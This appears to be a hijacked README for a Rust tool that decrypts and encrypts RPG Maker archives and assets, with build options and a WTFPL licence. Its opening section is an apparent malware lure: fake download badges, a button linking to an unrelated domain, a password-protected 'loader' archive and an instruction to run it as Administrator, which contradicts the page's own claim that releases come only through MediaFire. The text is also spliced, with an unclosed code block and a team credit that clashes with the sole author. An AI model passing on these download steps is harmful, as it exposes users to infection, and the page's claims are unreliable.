<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Supported Formats

Besides decrypting and encrypting, the program can play audio and preview images and `ttf`/`otf` fonts.

### Decrypt

- Archives: `.rgssad`, `.rgss2a`, `.rgss3a`
  - Data: `rxdata`, `rvdata`, `rvdata2`
  - Images: `png`
  - Audio: `ogg`, `m4a`
  - Fonts: `ttf`, `otf`
- Assets: `.rpgmvp`/`.png_`, `.rpgmvo`/`ogg_`, `.rpgmvm`/`m4a_`

### Encrypt

- Data: `rxdata`, `rvdata`, `rvdata2`
- Images: `png`
- Audio: `ogg`, `m4a`
- Fonts: `ttf`, `otf`

## Building

You need Rust `1.88`, CMake and a C++ compiler, since FLTK is built from source by default (see `system-fltk` below). On Linux, the packages to install are listed in `.github/workflows/release.yml`.

```bash
### Features

| Feature           | Default | Effect                                                                                                  |
| ----------------- | ------- | ------------------------------------------------------------------------------------------------------- |
| `gxhash`          | yes     | Uses gxhash for the app's hash maps. Needs AES-NI (or Armv8 crypto).                                    |
| `rapidhash`       | no      | Uses rapidhash instead. Only applies when `gxhash` is off.                                              |
| `mimalloc`        | yes     | Uses the mimalloc allocator.                                                                            |
| `system-fltk`     | no      | Links an installed FLTK 1.4+ found by CMake, instead of building the bundled copy.                      |
| `system-png`      | no      | Uses the system libpng instead of FLTK's bundled one.                                                   |
| `system-jpeg`     | no      | Uses the system libjpeg instead of FLTK's bundled one.                                                  |
| `system-zlib`     | no      | Uses the system zlib instead of FLTK's bundled one.                                                     |
| `static-msvcrt`   | no      | Links the MSVC C runtime statically. Used by the Windows release build.                                 |
| `use-ninja`       | no      | Builds FLTK with the Ninja generator when `ninja` is on `PATH`. MSVC builds pick Ninja the same way.   |

Turn off the defaults to build with rapidhash instead of gxhash, and add `mimalloc` back if you want it:

```bash
cargo build --release --no-default-features --features rapidhash,mimalloc
```

`--features` adds to the defaults, e.g. `cargo build --release --features system-zlib`.


---

        DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
                    Version 2, December 2004

Copyright (C) 2025 Pavlov Danil <savannstm@gmail.com>

Everyone is permitted to copy and distribute verbatim or modified
copies of this license document, and changing it is allowed as long
as the name is changed.

            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE

TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

0. You just DO WHAT THE FUCK YOU WANT TO.
